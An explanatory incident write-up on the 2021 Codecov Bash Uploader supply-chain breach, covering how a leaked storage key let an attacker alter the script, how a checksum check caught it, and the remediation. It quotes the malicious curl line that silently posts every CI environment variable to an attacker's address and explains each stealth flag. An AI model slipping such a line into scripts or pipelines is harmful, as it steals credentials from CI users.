---
title: "One added line in Codecov's Bash Uploader sent CI secrets to an attacker from January to April"
dek: "A credential leaked through Codecov's Docker image build let an attacker edit the Bash Uploader that customers' CI pipelines download and run. One added curl line posted every environment variable to the attacker's server, silently, until a customer compared checksums."
date: 2021-01-31
company: Codecov
kind: security-breach
topics: [supply-chain, security, data-leak]
stack: [bash, docker, gcs, ci]
impact: "Between January 31 and April 1, 2021, the modified Bash Uploader could send any credentials, tokens or keys in customers' CI environments, plus their git remote URLs, to a third-party server."
detected_by: customers
rule: "A script you pipe into a shell from the network runs with every secret your CI holds. Pin it and verify its checksum, or treat it as untrusted code."
postmortem: https://about.codecov.io/security-update/
sources: [https://about.codecov.io/security-update/]
---

# One added line in Codecov's Bash Uploader sent CI secrets to an attacker from January to April

On the morning of 1 April 2021, a Codecov customer noticed something wrong. They used the checksum Codecov publishes for its Bash Uploader to verify the script their CI downloaded from `https://codecov.io/bash`. The checksum [didn't match](https://about.codecov.io/security-update/). They reported it, and Codecov found that someone had modified the script.

Codecov's investigation found that [beginning January 31, 2021, there were periodic, unauthorized alterations](https://about.codecov.io/security-update/) of the Bash Uploader by a third party. The change was one line. It sent every environment variable in the CI job, plus the repository's git remote, to a server outside Codecov's infrastructure.

The Bash Uploader isn't a niche tool. It is also the engine inside [the Codecov GitHub Action, the CircleCI Orb and the Bitrise Step](https://about.codecov.io/security-update/), so all of those were affected too.

## What happened

From [Codecov's security update](https://about.codecov.io/security-update/):

- **How the attacker got in:** "an error in Codecov's Docker image creation process that allowed the actor to extract the credential required to modify our Bash Uploader script." The FAQ identifies the credential as a **Google Cloud Storage (GCS) key**.
- **When:** periodic, unauthorized access to that key starting 31 January 2021. Codecov later counted [108 windows of time](https://about.codecov.io/security-update/) between 31 January and 1 April when the malicious uploader was live.
- **What changed:** Codecov says it is confident [the only change ever to be made to the bash uploader was the change above](https://about.codecov.io/security-update/).
- **Discovery:** a customer's checksum comparison on 1 April.
- **Response:** Codecov secured the script, brought in a forensic firm, reported to law enforcement, and on 15 April emailed affected users and added an in-app banner.

Codecov says it hasn't been able to [determine conclusively who carried out the event](https://about.codecov.io/security-update/).

## What the engineers believed

None of the sources describes Codecov's internal reasoning, so this section is interpretation.

On the customer side, the standard instruction for tools like this is to download and run in one step. *Background:* a line like `bash <(curl -s https://codecov.io/bash)` is the usual way to use it. That pattern assumes the URL will always serve what the vendor wrote. The vendor controls the server, and HTTPS proves you're talking to it, so it feels safe.

On Codecov's side, the GCS credential that could write the uploader was presumably considered internal. It had ended up somewhere reachable through the Docker image build process. The update doesn't say exactly where or how.

## What was actually going on

### The line

Codecov published the modification:

```bash
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://IPADDRESS/upload/v2 || true
```

Reading it piece by piece (the flag meanings are standard curl and bash):

- `$(env)` expands to **every environment variable** in the CI job. In most CI systems that's where secrets live: cloud keys, deploy tokens, package-registry tokens, database URLs.
- `$(git remote -v)` adds the repository's remote URL, which tells the attacker whose secrets these are.
- `-d` POSTs all of it as the request body to the attacker's IP. Codecov published the two destination addresses in its indicators of compromise.
- `-s` is silent: no progress output in the CI log.
- `-m 0.5` caps the request at half a second, so a slow or unreachable server never noticeably delays the build.
- `|| true` throws away any failure, so the line can never break the job.

Every flag is about not being noticed. The line doesn't break the build, doesn't add visible time, and doesn't print anything. Coverage still uploads normally, because the rest of the script is unchanged.

```diagram
title: why one line exposed every CI secret
flow: CI job -> curl codecov.io/bash -> uploads coverage
flow!: same script -> POST $(env) to attacker -> secrets leave CI
note: -s, 0.5s timeout, || true: nothing in the log
```

### Why one edited file reached so many pipelines

*Background:* a script served from a fixed URL and fetched fresh on every run is a single point of distribution. Change the file once and every pipeline that runs after that picks it up, with no version bump, no pull request and no lockfile diff. That's exactly what makes it convenient, and it's also what made it valuable to the attacker. The CI runner gives the script the same environment it gives your own build steps, secrets included.

That's why Codecov's impact list covers more than environment variables. It includes [any services, datastores, and application code that could be accessed with these credentials](https://about.codecov.io/security-update/). The stolen values were keys to other systems.

### How the credential leaked

Codecov says only that the error was in its Docker image creation process. *General background, not a claim about Codecov's specific error:* secrets that pass through a Docker build can survive in the final image in several ways. A file copied in and deleted in a later layer is still in the earlier layer. Build arguments can show up in image history. Credentials baked in for a build step can stay in the filesystem. Anyone who can pull the image can inspect every layer.

### What actually caught it

The checksum. Codecov published a SHA for the Bash Uploader on GitHub, separate from the server that served the script. The customer compared [the shasum on Github and the shasum calculated from the downloaded Bash Uploader](https://about.codecov.io/security-update/), saw they differed, and reported it. Codecov notes that customers who [conducted a checksum comparison before using our Bash Uploaders](https://about.codecov.io/security-update/) may not have been affected.

The check worked because the expected checksum and the script came from two different places. An attacker who could change the script couldn't also change the checksum on GitHub.

## How they fixed it

Codecov [remediated the affected script](https://about.codecov.io/security-update/) and listed its steps:

- Rotated all relevant internal credentials, including the key used to modify the uploader.
- Audited where and how the key was accessible.
- Added monitoring and auditing so this kind of unintended change to the uploader can't happen again.
- Worked with the hosting provider to make sure the attacker's server was decommissioned.

For customers, the instruction was blunt: if you used the Bash Uploaders between 31 January and 1 April without checksum validation, [re-roll all of your credentials, tokens, or keys](https://about.codecov.io/security-update/) in your CI environment. Codecov suggested running `env` in the pipeline to see what was exposed, and checking any locally stored copy of the uploader for the malicious line. Self-hosted Codecov users were [very unlikely](https://about.codecov.io/security-update/) to be affected unless their CI still fetched the script from `codecov.io`.

## What changed afterwards

Codecov's update describes the changes above plus [reinforcing our security tools, policies, and procedures](https://about.codecov.io/security-update/), governance and staffing. A 29 April update said Codecov had obtained a redacted set of environment variables it had evidence were compromised, and evidence of how they may have been used, and showed affected users the details in the app.

## The rule

Anything you `curl | bash` in CI runs with every secret in that job. Pin the script to a specific version, verify it against a checksum published somewhere else, and better still, vendor it into your repository so changes show up in review. On the secrets side, expose to each CI step only the credentials it needs. A coverage uploader doesn't need your deploy keys, and if they aren't in its environment, `$(env)` can't send them anywhere.

## Sources

- [Codecov, "Bash Uploader Security Update"](https://about.codecov.io/security-update/): the official statement and FAQ, with the attack vector, the modified line, the dates and 108 windows, discovery by checksum, affected uploaders, indicators of compromise, remediation steps and customer guidance.
